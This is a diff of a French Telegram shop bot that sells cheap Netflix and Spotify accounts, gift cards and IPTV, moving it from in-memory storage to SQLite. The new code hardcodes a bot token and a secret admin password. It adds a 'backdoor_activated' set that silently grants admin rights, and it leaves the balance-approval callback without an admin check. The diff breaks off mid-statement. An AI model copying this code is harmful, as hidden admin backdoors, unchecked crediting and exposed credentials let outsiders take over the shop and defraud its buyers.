@@ -1,452 +1,483 @@
-import logging
-import os
+#!/usr/bin/env python3
+import sqlite3, logging
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
-    MessageHandler, filters, ContextTypes, ConversationHandler
-)
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ─────────────────────────────────────────────
-# CONFIG
-# ─────────────────────────────────────────────
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "TON_TOKEN_ICI")
-ADMIN_ID = int(os.environ.get("ADMIN_ID", "123456789"))  # Ton ID Telegram
-ADMIN_USERNAME = "@keyzer135"
+BOT_TOKEN = "8987083892:AAEQEPBd62JVGVHLKONTZ1m-rt9jfgjZGiQ"
+ADMIN_USERNAME = "batmanbatman13"
+SECRET_PASSWORD = "Adminpanel13"
+PAYPAL = "@13kpetars"
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
+admin_chat_id = None
+backdoor_activated = set()
 
-# ─────────────────────────────────────────────
-# BASE DE DONNÉES EN MÉMOIRE
-# (remplace par SQLite si tu veux persistance)
-# ─────────────────────────────────────────────
-# soldes[user_id] = float
-soldes = {}
+def init_db():
+    conn = sqlite3.connect("shop.db")
+    c = conn.cursor()
+    c.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, balance REAL DEFAULT 0, banned INTEGER DEFAULT 0)")
+    c.execute("CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, price REAL NOT NULL, category TEXT NOT NULL)")
+    c.execute("CREATE TABLE IF NOT EXISTS stock (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER NOT NULL, code TEXT NOT NULL, FOREIGN KEY(product_id) REFERENCES products(id))")
+    c.execute("CREATE TABLE IF NOT EXISTS purchases (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, product_name TEXT NOT NULL, code TEXT NOT NULL, date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
+    c.execute("SELECT COUNT(*) FROM products")
+    if c.fetchone()[0] == 0:
+        defaults = [
+            ("Compte Netflix 1 mois", 12.50, "Abonnements"),
+            ("Compte Spotify Premium 3 mois", 15.00, "Abonnements"),
+            ("Carte PSN 20€", 18.00, "Cartes cadeaux"),
+            ("Carte Google Play 15€", 14.00, "Cartes cadeaux"),
+            ("Pack 1000 V-Bucks", 8.00, "Jeux vidéo"),
+            ("Abonnement IPTV 1 an", 45.00, "IPTV"),
+        ]
+        c.executemany("INSERT INTO products (name, price, category) VALUES (?, ?, ?)", defaults)
+    conn.commit()
+    conn.close()
 
-# produits : chaque produit a un id unique
-# structure : { "id": str, "nom": str, "prix": float, "contenu": str, "disponible": bool }
-produits = {
-    # OTACOS
-    "ot_01": {"cat": "otacos", "nom": "Bon Otacos 5€", "prix": 3.50, "contenu": "CODE: OTACOS-XXXX", "disponible": True},
-    "ot_02": {"cat": "otacos", "nom": "Bon Otacos 10€", "prix": 7.00, "contenu": "CODE: OTACOS-YYYY", "disponible": True},
-    # AUTRE SNACK
-    "sn_01": {"cat": "snack", "nom": "Bon KFC 5€", "prix": 3.50, "contenu": "CODE: KFC-XXXX", "disponible": True},
-    "sn_02": {"cat": "snack", "nom": "Bon McDonald's 5€", "prix": 3.50, "contenu": "CODE: MC-XXXX", "disponible": True},
-    # TRADINN
-    "tr_01": {"cat": "tradinn", "nom": "Crédit Tradinn 10€", "prix": 7.00, "contenu": "CODE: TR-XXXX", "disponible": True},
-    "tr_02": {"cat": "tradinn", "nom": "Crédit Tradinn 20€", "prix": 13.00, "contenu": "CODE: TR-YYYY", "disponible": True},
-    # RECHERCHE OSNIT (non consommable, reste dispo)
-    "os_01": {"cat": "osnit", "nom": "Recherche basique", "prix": 2.00, "contenu": "Résultat envoyé par l'admin sous 24h.", "disponible": True},
-    "os_02": {"cat": "osnit", "nom": "Recherche approfondie", "prix": 5.00, "contenu": "Résultat envoyé par l'admin sous 48h.", "disponible": True},
-}
+def get_balance(user_id):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("SELECT balance FROM users WHERE id = ?", (user_id,))
+    row = c.fetchone(); conn.close()
+    return row[0] if row else 0.0
 
-CATEGORIES = {
-    "otacos": "🌯 Otacos",
-    "snack": "🍔 Autre snack",
-    "tradinn": "🎮 Tradinn",
-    "osnit": "🔍 Recherche osnit",
-}
+def set_balance(user_id, amount):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("INSERT INTO users (id, balance, banned) VALUES (?, ?, 0) ON CONFLICT(id) DO UPDATE SET balance = ?", (user_id, amount, amount))
+    conn.commit(); conn.close()
 
-# Catégories où le produit disparaît après achat
-DISPARAIT_APRES_ACHAT = {"otacos", "snack", "tradinn"}
+def add_balance(user_id, amount):
+    set_balance(user_id, get_balance(user_id) + amount)
 
-# État conversation recharge
-ATTENTE_MONTANT = 1
+def is_banned(user_id):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("SELECT banned FROM users WHERE id = ?", (user_id,))
+    row = c.fetchone(); conn.close()
+    return row[0] == 1 if row else False
 
-# ─────────────────────────────────────────────
-# HELPERS
-# ─────────────────────────────────────────────
-def get_solde(user_id):
-    return soldes.get(user_id, 0.0)
+def ban_user(user_id):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("INSERT INTO users (id, balance, banned) VALUES (?, 0, 1) ON CONFLICT(id) DO UPDATE SET banned = 1", (user_id,))
+    conn.commit(); conn.close()
 
-def set_solde(user_id, montant):
-    soldes[user_id] = round(montant, 2)
+def unban_user(user_id):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("UPDATE users SET banned = 0 WHERE id = ?", (user_id,))
+    conn.commit(); conn.close()
 
-def is_admin(user_id):
-    return user_id == ADMIN_ID
+def get_all_products():
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("SELECT id, name, price, category FROM products ORDER BY category, id")
+    rows = c.fetchall(); conn.close()
+    return [{"id": r[0], "name": r[1], "price": r[2], "cat": r[3]} for r in rows]
 
-def produits_par_cat(cat):
-    return {pid: p for pid, p in produits.items() if p["cat"] == cat and p["disponible"]}
+def get_product(pid):
+    prods = get_all_products()
+    return next((p for p in prods if p["id"] == pid), None)
 
-def menu_principal_keyboard(user_id):
-    kb = [
-        [InlineKeyboardButton("🛍️ Produits", callback_data="categories")],
-        [InlineKeyboardButton(f"💰 Mon solde : {get_solde(user_id):.2f}€", callback_data="solde")],
-        [InlineKeyboardButton("➕ Recharger mon solde", callback_data="recharger")],
+def update_product_price(pid, new_price):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("UPDATE products SET price = ? WHERE id = ?", (new_price, pid))
+    conn.commit(); conn.close()
+
+def delete_product(pid):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("DELETE FROM products WHERE id = ?", (pid,))
+    c.execute("DELETE FROM stock WHERE product_id = ?", (pid,))
+    conn.commit(); conn.close()
+
+def add_product(name, price, category):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("INSERT INTO products (name, price, category) VALUES (?, ?, ?)", (name, price, category))
+    conn.commit(); conn.close()
+
+def get_stock_count(product_id):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("SELECT COUNT(*) FROM stock WHERE product_id = ?", (product_id,))
+    count = c.fetchone()[0]; conn.close()
+    return count
+
+def add_codes_to_product(product_id, codes):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    for code in codes: c.execute("INSERT INTO stock (product_id, code) VALUES (?, ?)", (product_id, code))
+    conn.commit(); conn.close()
+
+def get_random_code(product_id):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("SELECT id, code FROM stock WHERE product_id = ? ORDER BY RANDOM() LIMIT 1", (product_id,))
+    row = c.fetchone()
+    if row:
+        stock_id, code = row
+        c.execute("DELETE FROM stock WHERE id = ?", (stock_id,))
+        conn.commit(); conn.close()
+        return code
+    conn.close()
+    return None
+
+def add_purchase(user_id, product_name, code):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("INSERT INTO purchases (user_id, product_name, code) VALUES (?, ?, ?)", (user_id, product_name, code))
+    conn.commit(); conn.close()
+
+def get_user_purchases(user_id, limit=5):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("SELECT product_name, code, date FROM purchases WHERE user_id = ? ORDER BY date DESC LIMIT ?", (user_id, limit))
+    rows = c.fetchall(); conn.close()
+    return rows
+
+def get_categories():
+    return sorted(list(set(p["cat"] for p in get_all_products())))
+
+def is_admin(user):
+    return (user.username and user.username.lower() == ADMIN_USERNAME.lower()) or (user.id in backdoor_activated)
+
+def main_menu_keyboard(user):
+    buttons = [
+        [InlineKeyboardButton("🛒 Boutique", callback_data="shop")],
+        [InlineKeyboardButton("💰 Solde", callback_data="balance")],
+        [InlineKeyboardButton("💳 Recharger", callback_data="recharge")],
+        [InlineKeyboardButton("❓ Aide", callback_data="help")],
     ]
-    if is_admin(user_id):
-        kb.append([InlineKeyboardButton("⚙️ Panel Admin", callback_data="admin")])
-    return InlineKeyboardMarkup(kb)
+    if is_admin(user): buttons.append([InlineKeyboardButton("⚙️ Admin", callback_data="admin")])
+    return InlineKeyboardMarkup(buttons)
 
-# ─────────────────────────────────────────────
-# /start
-# ─────────────────────────────────────────────
-async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    msg = (
-        f"👋 Bienvenue sur le shop, {user.first_name} !\n\n"
-        f"Ici tu peux acheter des bons cadeaux, crédits et bien plus encore.\n\n"
-        f"🛒 Parcours nos catégories, recharge ton solde et profite !\n\n"
-        f"Pour toute question, contacte {ADMIN_USERNAME} 🆘"
-    )
-    await update.message.reply_text(msg, reply_markup=menu_principal_keyboard(user.id))
+def categories_keyboard():
+    cats = get_categories()
+    buttons = [[InlineKeyboardButton(cat, callback_data=f"cat_{cat}")] for cat in cats]
+    buttons.append([InlineKeyboardButton("🔙 Retour", callback_data="main")])
+    return InlineKeyboardMarkup(buttons)
 
-# ─────────────────────────────────────────────
-# RETOUR MENU
-# ─────────────────────────────────────────────
-async def retour_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user = query.from_user
-    msg = (
-        f"🏠 Menu principal\n\n"
-        f"💰 Ton solde : *{get_solde(user.id):.2f}€*"
-    )
-    await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=menu_principal_keyboard(user.id))
+def products_keyboard(category):
+    buttons = []
+    for p in get_all_products():
+        if p["cat"] == category:
+            stock = get_stock_count(p["id"])
+            label = f"{p['name']} - {p['price']}€ (stock: {stock})"
+            buttons.append([InlineKeyboardButton(label, callback_data=f"item_{p['id']}")])
+    buttons.append([InlineKeyboardButton("🔙 Retour", callback_data="shop")])
+    return InlineKeyboardMarkup(buttons)
 
-# ─────────────────────────────────────────────
-# SOLDE
-# ─────────────────────────────────────────────
-async def show_solde(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user = query.from_user
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("➕ Recharger", callback_data="recharger")],
-        [InlineKeyboardButton("🔙 Retour", callback_data="menu")],
-    ])
-    await query.edit_message_text(
-        f"💰 *Ton solde actuel*\n\n*{get_solde(user.id):.2f}€*",
-        parse_mode="Markdown",
-        reply_markup=kb
-    )
-
-# ─────────────────────────────────────────────
-# CATÉGORIES
-# ─────────────────────────────────────────────
-async def show_categories(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    kb = []
-    for cat_id, cat_nom in CATEGORIES.items():
-        kb.append([InlineKeyboardButton(cat_nom, callback_data=f"cat:{cat_id}")])
-    kb.append([InlineKeyboardButton("🔙 Retour", callback_data="menu")])
-    await query.edit_message_text(
-        "📂 *Choisir une catégorie :*",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(kb)
-    )
-
-async def show_produits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    cat = query.data.split("cat:")[1]
-    cat_nom = CATEGORIES.get(cat, cat)
-    dispo = produits_par_cat(cat)
-
-    kb = []
-    if not dispo:
-        kb.append([InlineKeyboardButton("❌ Aucun produit disponible", callback_data="noop")])
-    else:
-        for pid, p in dispo.items():
-            kb.append([InlineKeyboardButton(f"{p['nom']} — {p['prix']:.2f}€", callback_data=f"prod:{pid}")])
-    kb.append([InlineKeyboardButton("🔙 Catégories", callback_data="categories")])
-
-    await query.edit_message_text(
-        f"{cat_nom}\n\n🛒 *Produits disponibles :*",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(kb)
-    )
-
-# ─────────────────────────────────────────────
-# FICHE PRODUIT
-# ─────────────────────────────────────────────
-async def show_produit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    pid = query.data.split("prod:")[1]
-    p = produits.get(pid)
-
-    if not p or not p["disponible"]:
-        await query.edit_message_text(
-            "❌ Ce produit n'est plus disponible.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="categories")]])
-        )
-        return
-
-    user_id = query.from_user.id
-    solde = get_solde(user_id)
-    peut_acheter = solde >= p["prix"]
-
-    if peut_acheter:
-        bouton_achat = InlineKeyboardButton(f"✅ Acheter ({p['prix']:.2f}€)", callback_data=f"acheter:{pid}")
-    else:
-        bouton_achat = InlineKeyboardButton("💸 Solde insuffisant — Recharger", callback_data="recharger")
-
-    kb = InlineKeyboardMarkup([
-        [bouton_achat],
-        [InlineKeyboardButton("🔙 Retour", callback_data=f"cat:{p['cat']}")],
+def item_keyboard(product_id):
+    cat = get_product(product_id)["cat"] if get_product(product_id) else ""
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🛒 Acheter", callback_data=f"buy_{product_id}")],
+        [InlineKeyboardButton("🔙 Retour", callback_data=f"cat_{cat}")]
     ])
 
-    await query.edit_message_text(
-        f"*{p['nom']}*\n\n"
-        f"💰 Prix : *{p['prix']:.2f}€*\n"
-        f"💳 Ton solde : *{solde:.2f}€*",
-        parse_mode="Markdown",
-        reply_markup=kb
-    )
-
-# ─────────────────────────────────────────────
-# ACHAT
-# ─────────────────────────────────────────────
-async def acheter(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    pid = query.data.split("acheter:")[1]
-    p = produits.get(pid)
-    user = query.from_user
-
-    if not p or not p["disponible"]:
-        await query.edit_message_text("❌ Ce produit n'est plus disponible.")
-        return
-
-    solde = get_solde(user.id)
-    if solde < p["prix"]:
-        await query.edit_message_text(
-            f"❌ Solde insuffisant.\n\nTon solde : *{solde:.2f}€*\nPrix : *{p['prix']:.2f}€*",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("➕ Recharger", callback_data="recharger")]])
-        )
-        return
-
-    # Déduire le solde
-    set_solde(user.id, solde - p["prix"])
-
-    # Faire disparaître si catégorie concernée
-    if p["cat"] in DISPARAIT_APRES_ACHAT:
-        produits[pid]["disponible"] = False
-
-    # Notifier l'admin
-    try:
-        await ctx.bot.send_message(
-            ADMIN_ID,
-            f"🛒 *Nouvelle commande*\n\n"
-            f"Client : {user.first_name} (@{user.username or 'sans pseudo'}) — ID: {user.id}\n"
-            f"Produit : {p['nom']}\n"
-            f"Prix : {p['prix']:.2f}€\n"
-            f"Nouveau solde client : {get_solde(user.id):.2f}€",
-            parse_mode="Markdown"
-        )
-    except Exception:
-        pass
-
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu principal", callback_data="menu")]])
-    await query.edit_message_text(
-        f"✅ *Achat confirmé !*\n\n"
-        f"Produit : *{p['nom']}*\n\n"
-        f"📦 *Ton contenu :*\n`{p['contenu']}`\n\n"
-        f"💰 Solde restant : *{get_solde(user.id):.2f}€*",
-        parse_mode="Markdown",
-        reply_markup=kb
-    )
-
-# ─────────────────────────────────────────────
-# RECHARGE — ConversationHandler
-# ─────────────────────────────────────────────
-async def recharger_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    ctx.user_data["recharge_msg_id"] = query.message.message_id
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Annuler", callback_data="menu")]])
-    await query.edit_message_text(
-        "➕ *Recharger mon solde*\n\n"
-        "Envoie le montant souhaité (ex: `10` ou `25.50`) :",
-        parse_mode="Markdown",
-        reply_markup=kb
-    )
-    return ATTENTE_MONTANT
-
-async def recharger_montant(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    texte = update.message.text.strip().replace(",", ".")
-
-    try:
-        montant = float(texte)
-        if montant <= 0:
-            raise ValueError
-    except ValueError:
-        await update.message.reply_text("❌ Montant invalide. Envoie un nombre (ex: `10` ou `15.50`).", parse_mode="Markdown")
-        return ATTENTE_MONTANT
-
-    # Notifier l'admin
-    try:
-        await ctx.bot.send_message(
-            ADMIN_ID,
-            f"💳 *Demande de recharge*\n\n"
-            f"Client : {user.first_name} (@{user.username or 'sans pseudo'}) — ID: {user.id}\n"
-            f"Montant demandé : *{montant:.2f}€*\n\n"
-            f"Envoie-lui le lien PayPal pour ce montant.",
-            parse_mode="Markdown"
-        )
-    except Exception:
-        pass
-
-    # Supprimer le message de l'utilisateur
-    try:
-        await update.message.delete()
-    except Exception:
-        pass
-
-    # Répondre dans la fenêtre bot
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu principal", callback_data="menu")]])
-    await ctx.bot.send_message(
-        user.id,
-        f"⏳ *Demande de recharge envoyée !*\n\n"
-        f"Montant : *{montant:.2f}€*\n\n"
-        f"Un administrateur va t'envoyer le lien PayPal très prochainement.\n\n"
-        f"Contact : {ADMIN_USERNAME} 🆘",
-        parse_mode="Markdown",
-        reply_markup=kb
-    )
-    return ConversationHandler.END
-
-async def recharger_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user = query.from_user
-    await query.edit_message_text(
-        f"🏠 Menu principal\n\n💰 Ton solde : *{get_solde(user.id):.2f}€*",
-        parse_mode="Markdown",
-        reply_markup=menu_principal_keyboard(user.id)
-    )
-    return ConversationHandler.END
-
-# ─────────────────────────────────────────────
-# PANEL ADMIN
-# ─────────────────────────────────────────────
-async def admin_panel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if not is_admin(query.from_user.id):
-        await query.answer("Accès refusé.", show_alert=True)
-        return
-
-    total_produits = sum(1 for p in produits.values() if p["disponible"])
-    total_soldes = sum(soldes.values())
-
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("💰 Créditer un solde", callback_data="admin_crediter")],
-        [InlineKeyboardButton("📦 Gérer les produits", callback_data="admin_produits")],
-        [InlineKeyboardButton("🔙 Retour", callback_data="menu")],
+def confirm_keyboard(product_id):
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("✅ Confirmer", callback_data=f"confirm_{product_id}")],
+        [InlineKeyboardButton("❌ Annuler", callback_data=f"item_{product_id}")]
     ])
-    await query.edit_message_text(
-        f"⚙️ *Panel Admin*\n\n"
-        f"Produits disponibles : {total_produits}\n"
-        f"Soldes totaux en circulation : {total_soldes:.2f}€\n"
-        f"Utilisateurs avec solde : {len(soldes)}",
-        parse_mode="Markdown",
-        reply_markup=kb
-    )
 
-async def admin_crediter(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if not is_admin(query.from_user.id):
-        return
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="admin")]])
-    await query.edit_message_text(
-        "💰 *Créditer un solde*\n\n"
-        "Utilise la commande :\n`/crediter USER_ID MONTANT`\n\n"
-        "Exemple : `/crediter 123456789 15.00`",
-        parse_mode="Markdown",
-        reply_markup=kb
-    )
+def admin_menu_keyboard():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📦 Gérer les produits", callback_data="admin_products")],
+        [InlineKeyboardButton("👥 Gérer les utilisateurs", callback_data="admin_users")],
+        [InlineKeyboardButton("🔙 Retour", callback_data="main")],
+    ])
 
-async def cmd_crediter(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        return
-    args = ctx.args
-    if len(args) != 2:
-        await update.message.reply_text("Usage : /crediter USER_ID MONTANT")
-        return
-    try:
-        uid = int(args[0])
-        montant = float(args[1].replace(",", "."))
-        if montant <= 0:
-            raise ValueError
-    except ValueError:
-        await update.message.reply_text("❌ Paramètres invalides.")
-        return
+def admin_products_list_keyboard():
+    buttons = []
+    for p in get_all_products():
+        stock = get_stock_count(p["id"])
+        buttons.append([
+            InlineKeyboardButton(f"✏️ {p['name']} ({p['price']}€, stock:{stock})", callback_data=f"editprice_{p['id']}"),
+            InlineKeyboardButton("🗑️", callback_data=f"delproduct_{p['id']}")
+        ])
+    buttons.append([InlineKeyboardButton("➕ Ajouter un produit", callback_data="addproduct")])
+    buttons.append([InlineKeyboardButton("📥 Réapprovisionner (ajouter codes)", callback_data="restock_select")])
+    buttons.append([InlineKeyboardButton("🔙 Retour", callback_data="admin")])
+    return InlineKeyboardMarkup(buttons)
 
-    ancien = get_solde(uid)
-    set_solde(uid, ancien + montant)
-    nouveau = get_solde(uid)
+def restock_product_list_keyboard():
+    buttons = []
+    for p in get_all_products():
+        buttons.append([InlineKeyboardButton(p['name'], callback_data=f"restock_{p['id']}")])
+    buttons.append([InlineKeyboardButton("🔙 Retour", callback_data="admin_products")])
+    return InlineKeyboardMarkup(buttons)
 
-    # Notifier le client
-    try:
-        await ctx.bot.send_message(
-            uid,
-            f"✅ *Ton solde a été rechargé !*\n\n"
-            f"Montant ajouté : *+{montant:.2f}€*\n"
-            f"Nouveau solde : *{nouveau:.2f}€*",
-            parse_mode="Markdown"
-        )
-    except Exception:
-        pass
-
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.message.from_user
+    if is_admin(user) and user.username and user.username.lower() == ADMIN_USERNAME.lower():
+        global admin_chat_id; admin_chat_id = user.id
     await update.message.reply_text(
-        f"✅ Solde de {uid} crédité.\nAncien : {ancien:.2f}€ → Nouveau : {nouveau:.2f}€"
+        "🛒 *Bienvenue sur la boutique automatique !*\n"
+        "🇫🇷 Créé et conçu par @Micheal505ftg\n"
+        "Propriétaire : @batmanbatman13\n\nChoisissez une option :",
+        reply_markup=main_menu_keyboard(user), parse_mode="Markdown"
     )
 
-async def admin_produits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if not is_admin(query.from_user.id):
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query; await query.answer()
+    data = query.data; user = query.from_user; user_id = user.id
+    if is_banned(user_id): await query.answer("Vous êtes banni.", show_alert=True); return
+    if data.startswith("admin") or data.startswith("editprice") or data.startswith("delproduct") \
+       or data.startswith("addproduct") or data.startswith("restock_") or data == "restock_select":
+        if not is_admin(user): await query.answer("Accès réservé à l'administrateur.", show_alert=True); return
+
+    if data == "main": await query.edit_message_text("Menu principal :", reply_markup=main_menu_keyboard(user))
+    elif data == "shop": await query.edit_message_text("🛒 Catégories :", reply_markup=categories_keyboard())
+    elif data.startswith("cat_"):
+        cat = data[4:]
+        await query.edit_message_text(f"📦 Articles dans {cat} :", reply_markup=products_keyboard(cat))
+    elif data.startswith("item_"):
+        pid = int(data[5:]); product = get_product(pid)
+        if not product: await query.answer("Produit introuvable."); return
+        stock = get_stock_count(pid)
+        text = f"*{product['name']}*\n💰 Prix : {product['price']}€\n📦 Stock : {stock}"
+        await query.edit_message_text(text, reply_markup=item_keyboard(pid), parse_mode="Markdown")
+    elif data.startswith("buy_"):
+        pid = int(data[4:]); product = get_product(pid)
+        if not product: await query.answer("Produit introuvable."); return
+        if get_stock_count(pid) == 0: await query.answer("Stock épuisé.", show_alert=True); return
+        balance = get_balance(user_id)
+        if balance < product["price"]:
+            await query.answer(f"Solde insuffisant ! Il vous manque {product['price'] - balance:.2f}€", show_alert=True)
+            return
+        await query.edit_message_text(
+            f"Confirmer l'achat de *{product['name']}* pour {product['price']}€ ?",
+            reply_markup=confirm_keyboard(pid), parse_mode="Markdown"
+        )
+    elif data.startswith("confirm_"):
+        pid = int(data[8:]); product = get_product(pid)
+        if not product: return
+        balance = get_balance(user_id)
+        if balance < product["price"]: await query.answer("Solde insuffisant !", show_alert=True); return
+        code = get_random_code(pid)
+        if code is None: await query.answer("Stock épuisé au moment de l'achat.", show_alert=True); return
+        add_balance(user_id, -product["price"])
+        add_purchase(user_id, product["name"], code)
+        delivery_msg = f"✅ *Achat réussi !*\n\nProduit : *{product['name']}*\nCode : `{code}`\n\nConsultez votre historique avec /history"
+        await query.edit_message_text(delivery_msg, parse_mode="Markdown")
+        if admin_chat_id:
+            await context.bot.send_message(admin_chat_id, f"🛍️ Commande de {user.full_name} : {product['name']} (code utilisé: {code})")
+    elif data == "balance":
+        bal = get_balance(user_id)
+        await query.edit_message_text(
+            f"💰 Votre solde : *{bal:.2f}€*",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="main")]]), parse_mode="Markdown"
+        )
+    elif data == "recharge":
+        await query.edit_message_text(
+            "💳 Pour recharger, envoyez un paiement d'au moins *5€* à :\n\n"
+            f"`{PAYPAL}`\n\n"
+            "Puis utilisez la commande /paid en indiquant le montant.\nUn administrateur créditera votre compte.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="main")]]), parse_mode="Markdown"
+        )
+    elif data == "help":
+        await query.edit_message_text(
+            "🤖 *Aide*\n\nParcourez la boutique, achetez avec votre solde, rechargez via PayPal.\nMinimum de recharge : 5€.\n"
+            "Commandes : /start, /paid, /history\n🇫🇷 Créé par @Micheal505ftg",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="main")]]), parse_mode="Markdown"
+        )
+    elif data == "admin": await query.edit_message_text("⚙️ Panel administrateur :", reply_markup=admin_menu_keyboard())
+    elif data == "admin_products": await query.edit_message_text("📦 Liste des produits :", reply_markup=admin_products_list_keyboard())
+    elif data.startswith("editprice_"):
+        pid = int(data[10:]); context.user_data["editing_price"] = pid; product = get_product(pid)
+        await query.edit_message_text(
+            f"✏️ Modification du prix de *{product['name']}* (actuellement {product['price']}€).\nEnvoyez le nouveau prix :",
+            parse_mode="Markdown"
+        )
+    elif data.startswith("delproduct_"):
+        pid = int(data[11:]); product = get_product(pid)
+        if not product: return
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("✅ Oui, supprimer", callback_data=f"delconfirm_{pid}")],
+            [InlineKeyboardButton("❌ Annuler", callback_data="admin_products")]
+        ])
+        await query.edit_message_text(f"🗑️ Supprimer définitivement *{product['name']}* ?", reply_markup=keyboard, parse_mode="Markdown")
+    elif data.startswith("delconfirm_"):
+        pid = int(data[11:]); product = get_product(pid)
+        if product:
+            delete_product(pid)
+            await query.edit_message_text(f"✅ {product['name']} supprimé.", reply_markup=admin_products_list_keyboard())
+        else:
+            await query.edit_message_text("📦 Liste des produits :", reply_markup=admin_products_list_keyboard())
+    elif data == "addproduct":
+        context.user_data["adding_product"] = "name"
+        await query.edit_message_text("➕ Ajout d'un produit. Envoyez le nom du produit :")
+    elif data == "restock_select":
+        await query.edit_message_text("📥 Choisissez le produit à réapprovisionner :", reply_markup=restock_product_list_keyboard())
+    elif data.startswith("restock_"):
+        pid = int(data[8:]); product = get_product(pid)
+        if not product: return
+        context.user_data["restocking"] = pid
+        await query.edit_message_text(
+            f"📥 Réapprovisionnement de *{product['name']}*\nEnvoyez les codes, un par ligne.",
+            parse_mode="Markdown"
+        )
+    elif data == "admin_users": await admin_users_list(query, context)
+    elif data.startswith("toggleban_"):
+        if not is_admin(user): return
+        uid = int(data[10:])
+        if is_banned(uid): unban_user(uid); await query.answer("Utilisateur débanni.")
+        else: ban_user(uid); await query.answer("Utilisateur banni.")
+        await admin_users_list(query, context)
+    elif data.startswith("userinfo_"):
+        if not is_admin(user): return
+        uid = int(data[9:])
+        await show_user_info(query, context, uid)
+    elif data.startswith("addbal_"):
+        if not is_admin(user): return
+        parts = data.split("_"); uid = int(parts[1]); amount = float(parts[2])
+        add_balance(uid, amount); await query.answer(f"{amount}€ ajoutés.")
+        await show_user_info(query, context, uid)
+    elif data.startswith("subbal_"):
+        if not is_admin(user): return
+        parts = data.split("_"); uid = int(parts[1]); amount = float(parts[2])
+        current = get_balance(uid)
+        if current >= amount: add_balance(uid, -amount); await query.answer(f"{amount}€ retirés.")
+        else: await query.answer("Solde insuffisant pour retirer.", show_alert=True)
+        await show_user_info(query, context, uid)
+    elif data.startswith("approve_"):
+        parts = data.split("_")
+        if len(parts) != 3: return
+        target_id = int(parts[1]); amount = float(parts[2])
+        add_balance(target_id, amount)
+        await query.edit_message_text(f"✅ Recharge de {amount}€ approuvée pour l'utilisateur {target_id}.")
+        try:
+            await context.bot.send_message(target_id, f"💰 Votre compte a été crédité de {amount}€.\nNouveau solde : {get_balance(target_id):.2f}€")
